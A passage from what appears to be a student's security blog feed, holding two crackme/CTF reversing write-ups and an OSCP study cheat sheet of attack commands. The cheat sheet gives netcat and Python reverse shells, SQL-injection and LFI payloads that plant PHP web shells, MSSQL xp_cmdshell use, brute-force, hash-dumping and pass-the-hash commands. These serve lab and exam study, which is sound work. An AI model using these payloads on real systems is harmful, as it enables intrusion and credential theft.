        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I am going to show you how I reverse engineered this binary and cracked the password. First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”</summary></entry><entry><title type="html">Reversing the buildString CTF challenge</title><link href="http://localhost:4000/2020/02/22/reversing-buildString-program.html" rel="alternate" type="text/html" title="Reversing the buildString CTF challenge" /><published>2020-02-22T00:00:00-05:00</published><updated>2020-02-22T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/22/reversing-buildString-program</id><content type="html" xml:base="http://localhost:4000/2020/02/22/reversing-buildString-program.html">&lt;p&gt;Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called &lt;a href=&quot;../../../assets/other/2020-2-22-reversing-buildString-program/buildString&quot;&gt;buildString&lt;/a&gt;, and upon executing the file, I was greeted with the following output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/output.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used r2ghidra to decompile the main function, and it is clear that there is a lot going on here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Essentially, the program is trying to generate a string using a strange algorithm that obfuscates what the string is. It took longer then I want to admit to figure out what I was supposed to do, but I eventually found out that the most important part to reversing this binary lies in the end of the main function, where another function called finalAssembly() is being called.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main_end.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I set a breakpoint at this function and took a look around. There are two function calls at the very beginning that are, presumably, being used to generate the string. I stepped over the two function calls and printed out the value of rdi, which happened to be “ZmxhZ3tFQHp5X1AzM3p5X2xlbW9uc3EzM3p5fQ==”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/finalAssembly.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After base64 decoding this value, I obtained the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/flag.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called buildString, and upon executing the file, I was greeted with the following output.</summary></entry><entry><title type="html">Cracking D4RKFL0W’s Crackme-4</title><link href="http://localhost:4000/2020/02/21/cracking-d4rkfl0w-crackme-4.html" rel="alternate" type="text/html" title="Cracking D4RKFL0W's Crackme-4" /><published>2020-02-21T00:00:00-05:00</published><updated>2020-02-21T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/21/cracking-d4rkfl0w-crackme-4</id><content type="html" xml:base="http://localhost:4000/2020/02/21/cracking-d4rkfl0w-crackme-4.html">&lt;p&gt;Today, I will be going over how I cracked &lt;a href=&quot;https://crackmes.one/crackme/5e0fa43b33c5d419aa01351e&quot;&gt;this crackme&lt;/a&gt;. When I first executed the program, it started off by asking me to enter some password, so it is clear that our goal here is to figure out what this password is.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/execution.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I opened up this binary in radare2 and saw that the main function was calling another function called prompt().&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I stepped into this function and saw that this function would print out “Please enter the password:” and read a line of input. There was another interesting function called Vault::checkPassword() being called near the end of the function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/prompt.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I stepped into Vault::checkPassword(). It seems as though this function calls another function called PasswordGen::buildPassword(), which probably builds the password, and then calls PasswordGen::checkPassword(), which is the function that we care about the most. If the password looks good, then it will print out a message stating that it is the correct password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/checkPasswordVault.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside of Vault::checkPassword(), there are function calls to c3(), c0(), c1(), c2(), c4(), c8(), c5(), c6(), and c7(). Each of these function calls generate and return one of the characters for the password, and the correct index of each character is indicated by the number coming after c (i.e., c3() returns the 3rd character of the password, c0() returns the 0th character of the password, etc.). After each function call, the corresponding character for the user’s input is checked against the character that was generated, and if the input does not equal the character, the program exits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/checkPasswordGen.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I set a breakpoint right after c3() executes, and I recorded the value of rax, which was 3a.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/c3.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I repeated this by setting breakpoints right after the other function calls to c0(), c1(), c2(), c4(), c8(), c5(), c6(), and c7(), and I continued to record the values of rax. These were the results:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c3(): rax = 0x3a
c0(): rax = 0x55
c1(): rax = 0x36
c2(): rax = 0x2d
c4(): rax = 0x59
c8(): rax = 0x2b
c5(): rax = 0x4c
c6(): rax = 0x2e
c7(): rax = 0x22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I had recreated all of the correct values for the password. Now all I had to do was to reorder the password values so that the 0th value comes first and the 8th value comes last and send the input using the below command.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &quot;print('\x55\x36\x2d\x3a\x59\x4c\x2e\x22\x2b')&quot; | ./Crackme-4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/correct.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be going over how I cracked this crackme. When I first executed the program, it started off by asking me to enter some password, so it is clear that our goal here is to figure out what this password is.</summary></entry><entry><title type="html">Useful OSCP Notes</title><link href="http://localhost:4000/2020/02/06/useful-oscp-notes.html" rel="alternate" type="text/html" title="Useful OSCP Notes" /><published>2020-02-06T00:00:00-05:00</published><updated>2020-02-06T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/06/useful-oscp-notes</id><content type="html" xml:base="http://localhost:4000/2020/02/06/useful-oscp-notes.html">&lt;p&gt;I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;p&gt;Ping Scan:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sn [IP addresses]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Search for specific port:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p [port] [IP addresses]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;OS Fingerprinting:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -O [IP address]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Banner Grabbing:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT [IP addresses]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Connect to SMB and determine OS:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap [IP address] --script smb-os-discovery.nse&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;DNS Zone Transfer:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script=dns-zone-transfer -p 53 [target]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;FTP Bounce Scan:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -b anonymous@[FTP Server] [target] -Pn&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List of NSE scripts that could be used for vulnerability scanning:
&lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l /usr/share/nmap/scripts/*vuln*&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;www.stationx.net/nmap-cheat-sheet/&quot;&gt;Link to a more in-depth Nmap quide&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;dns&quot;&gt;DNS&lt;/h3&gt;
&lt;p&gt;Finding name servers:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host -t ns example.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Finding mail servers:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host -t mx example.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Looking up an IP address:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host example.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force IP addresses given a list of possible names:
&lt;code class=&quot;highlighter-rouge&quot;&gt;for ip in $(cat list.txt); do host $ip.example.com;done | grep -v &quot;not found&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force domain names given list of possible IP addresses:
&lt;code class=&quot;highlighter-rouge&quot;&gt;for ip in $(seq 155 190);do host xxx.xxx.xxx.$ip;done | grep -v &quot;not found&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Zone Transfer:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host -l example.com [name server]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Script that automatically checks each DNS server and does a zone transfer:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Simple Zone Transfer Bash Script 
#!/bin/bash 
# $1 is the first argument given after the bash script 
# Check if argument was given, if not, print usage 
if [ -z &quot;$1&quot; ]; then 
echo &quot;[*] Simple Zone transfer script&quot; 
echo &quot;[*] Usage 
: $0 &amp;lt;domain name&amp;gt; &quot; 
exit 0 
fi 
# if argument was given, identify the DNS servers for the domain 
for server in $(host -t ns $1 |cut -d&quot; &quot; -f4);do 
# For each of these servers, attempt a zone transfer 
host -l $1 $server |grep &quot;has address&quot; 
done 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
&lt;p&gt;General enumeration:
&lt;code class=&quot;highlighter-rouge&quot;&gt;enum4linux -a [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Scan for open shares:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nbtscan -r [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;OS discovery:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -v -p 139, 445 --script=smb-os-discovery [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;SMB vuln scan:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -v -p 139,445 --script=smb-vuln* --script-args=unsafe=1 &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Finding version of SMB: Use &lt;a href=&quot;https://raw.githubusercontent.com/rewardone/OSCPRepo/master/scripts/recon_enum/smbver.sh&quot;&gt;this script&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;SMBMap:
&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;View share names:
&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L [IP] -N&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Connecting to an SMB share:
&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient \\\\[IP]\\[share name]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Mount shares:
&lt;code class=&quot;highlighter-rouge&quot;&gt;mount -t cifs //[IP]/[share name] [folder to mount to] -o username=[username],vers=1.0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Common exploits: &lt;a href=&quot;https://www.exploit-db.com/exploits/40279&quot;&gt;MS08-067&lt;/a&gt; and &lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;MS17-010&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;

&lt;p&gt;Brute force directories:
&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u [URL] -w /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Scanning for possible vulns:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nikto --host [IP address]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Scanning for vulns in Wordpress:
&lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --url [URL]&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;
&lt;p&gt;Netcat reverse shell (target): &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nv [your IP] [port] -e cmd.exe&lt;/code&gt;. Replace cmd.exe with /bin/sh if the target is on linux.&lt;/p&gt;

&lt;p&gt;Netcat reverse shell listener (local): &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nlvp 4444&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Python reverse shell: Make a local reverse shell listener, then run &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt; on the target (change the IP and port in the code).&lt;/p&gt;

&lt;p&gt;Amazing PHP reverse shell that I use all the time: &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A list of other handy reverse shells: &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;
&lt;p&gt;Useful guides: &lt;a href=&quot;http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html&quot;&gt;Security Idiots&lt;/a&gt; and &lt;a href=&quot;http://pentestmonkey.net/category/cheat-sheet/sql-injection&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Find the number of columns: Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;order by [count]&lt;/code&gt; instruction in your SQL injection. Start with 1, and then gradually increment count until you get an error.&lt;/p&gt;

&lt;p&gt;Adding your own select statement: Type in a normal query value and then type in &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,5,6&lt;/code&gt;. Note that both statements must have the same number of columns.&lt;/p&gt;

&lt;p&gt;Discover MySQL version: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,@@version,6&lt;/code&gt;. Obviously, you’ll have to modify this to use the correct number of columns.&lt;/p&gt;

&lt;p&gt;Discover the current user: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,user(),6&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Getting a list of tables: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,table_name,6 FROM information_schema.tables&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Getting the names of columns of a table: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,column_name,6 from information_schema.columns where table_name='users'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Concatenate strings from two columns in to a single column: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,concat(column1,0x3a,column2) from table_name&lt;/code&gt;. Replace column1, column2, and table_name with the correct values.&lt;/p&gt;

&lt;p&gt;Limit the number of rows returned: &lt;code class=&quot;highlighter-rouge&quot;&gt;LIMIT [rows]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Reading local files in MySQL: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,load_file('file/path'),6&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Writing local files: &lt;code class=&quot;highlighter-rouge&quot;&gt;'union all select 1,2,3,4,&quot;&amp;lt;?php echo shell_exec($_GET['cmd']);?&amp;gt;&quot;,6 into OUTFILE 'backdoor.php'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;MS-SQL instant root: Sometimes you can instantly root the machine if you have DB credentials for MSSQL. &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 443 -Pn -sS --script ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=password,mssql.instance-all,ms-sql-xp-cmdshell.cmd=&quot;whoami&quot; [IP]&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;lfirfi&quot;&gt;LFI/RFI&lt;/h3&gt;
&lt;p&gt;Suppose you have the ability to include any local php file on the target, and also suppose that you could write any php script to the target. You could write the following PHP code: &lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt; to obtain code execution via the cmd parameter.&lt;/p&gt;

&lt;p&gt;For RFIs, you can just set the PHP include parameter to be a file on your local web server that gives you code execution.&lt;/p&gt;

&lt;p&gt;For more information on LFI/RFI vulns, &lt;a href=&quot;https://hackersonlineclub.com/lfi-rfi/&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;password-attacks&quot;&gt;Password Attacks&lt;/h3&gt;
&lt;p&gt;List of default credentials: &lt;a href=&quot;http://open-sez.me/&quot;&gt;Open-sez.me&lt;/a&gt; and &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv&quot;&gt;Default-passwords&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Wordlists: Kali has wordlists located under /usr/share/wordlists/. There is also a common usernames file under /usr/share/commix/src/txt/usernames.txt&lt;/p&gt;

&lt;p&gt;Generate all possible combinations of a list of characters: &lt;code class=&quot;highlighter-rouge&quot;&gt;crunch [min] [max] [list of characters] -o [output file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Generate password lists using words from a website: &lt;code class=&quot;highlighter-rouge&quot;&gt;cewl [URL]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force websites using Medusa: &lt;code class=&quot;highlighter-rouge&quot;&gt;medusa -h [IP] -U [usernames file] -P [passwords file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Wordpress brute force: &lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --log --batch --url [IP address] --wordlist /usr/share/wordlists/rockyou.txt --username [username] --threads 20&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force web logins: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -l [user] -p [password] [IP] http-post-form &quot;&amp;lt;Login Page&amp;gt;:&amp;lt;Request Body&amp;gt;:&amp;lt;Error message&amp;gt;&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force RDP: &lt;code class=&quot;highlighter-rouge&quot;&gt;ncrack -vv --user [user] -P [passwords file] rdp://[IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force SNMP: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -P [passwords file] -v [IP] snmp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force SSH: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -l root -P [passwords file] [IP] ssh&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Dumping windows password hashes: Send over /usr/share/windows-binaries/fgdump.exe over to the target, and then run fgdump.exe. It will output files in a pwdump file.&lt;/p&gt;

&lt;p&gt;Windows credential editor: WCE can search for passwords and steal credentials from memory. It is located under the /usr/share/wce/ directory in Kali.&lt;/p&gt;

&lt;p&gt;Brute force pwdump (fgdump output): &lt;code class=&quot;highlighter-rouge&quot;&gt;john --wordlist=/usr/share/wordlists/rockyou.txt [pwdump file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Cracking linux hashes (you will need both /etc/passwd and /etc/shadow):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unshadow passwd-file.txt shadow-file.txt &amp;gt; unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Brute force password-protected zip files:
&lt;code class=&quot;highlighter-rouge&quot;&gt;fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt [zip file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Pass-the-hash for SMB:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export SMBHASH=[Hash]
pth-winexe -U administrator% //[IP] cmd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you want to login to SMB, you could also do &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -u [username] -p [hash] -H [IP]&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;file-uploaddownload&quot;&gt;File Upload/Download&lt;/h3&gt;
&lt;p&gt;&lt;b&gt;Netcat:&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On the receiving end: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -l -p 1234 &amp;gt; file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;On the sending end: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc [destination] 1234 &amp;lt; file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;pyftpdlib:&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On Kali Linux:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp folder/to/share
pip install pyftpdlib
python -m pyftpdlib -w -p 21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp [your IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;On the target, you could also write down the ftp commands you’ll use in a file and then run &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp -s:ftp_commands.txt&lt;/code&gt;. The first line should be &lt;code class=&quot;highlighter-rouge&quot;&gt;open [IP address]&lt;/code&gt;, and the next two lines should be the username and password (if the username is anonymous, you can set the password to be anything, but it must be something).&lt;/p&gt;

&lt;p&gt;&lt;b&gt;smbserver.py&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On Kali:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
smbserver.py a file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;\\[your IP]\a\file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;TFTP&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On Kali:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir tftp/
atftpd --daemon --port 69 tftp/
cp [file to send] tftp/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;tftp -i [your IP] get [file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;HTTP&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Setup a web server on Kali using &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable apache2&lt;/code&gt;. Copy the file that you want to send to /var/www/html/. Then navigate to http://[your IP]/file on the target system’s web browser. If you are unable to access the target system’s web browser, create a script called wget.vbs on the target machine by running the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo strUrl = WScript.Arguments.Item(0) &amp;gt; wget.vbs 
echo StrFile = WScript.Arguments.Item(1) &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &amp;gt;&amp;gt; wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &amp;gt;&amp;gt; wget.vbs 
